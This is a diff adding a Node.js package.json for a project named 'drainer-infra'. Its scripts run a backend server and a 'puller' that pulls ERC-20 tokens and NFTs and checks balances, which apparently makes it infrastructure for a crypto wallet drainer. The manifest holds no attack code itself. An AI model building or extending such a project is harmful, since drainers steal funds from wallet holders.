@@ -1,0 +1,15 @@
+{
+  "name": "drainer-infra",
+  "version": "1.0.0",
+  "private": true,
+  "dependencies": {
+    "ethers": "5.7.2",
+    "express": "^4.18.2"
+  },
+  "scripts": {
+    "backend": "node backend/server.js",
+    "pull-erc20": "node backend/puller.js pull-erc20",
+    "pull-nfts": "node backend/puller.js pull-nfts",
+    "balances": "node backend/puller.js balances"
+  }
+}
